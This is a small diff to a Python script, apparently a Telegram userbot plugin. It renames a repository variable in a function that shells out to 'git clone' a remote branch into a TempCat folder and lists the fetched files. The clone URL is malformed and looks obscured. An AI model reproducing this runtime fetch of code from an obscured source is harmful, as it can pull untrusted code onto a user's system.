@@ -29,7 +29,7 @@ JOKRDEV = [1374312239, 393120911, 1490479382,5564802580]
 
 async def hrbe_4ever():
     BRANCH = "main"
-    REPO = "sors1"
+    REPO = "sorse1"
     if REPO:
         await _catutils.runcmd(f"git clone -b {BRANCH} https:/aesareetcuu6jllk/github.com/a/{REPO}.git TempCat")
         file_list = os.listdir("TempCat")
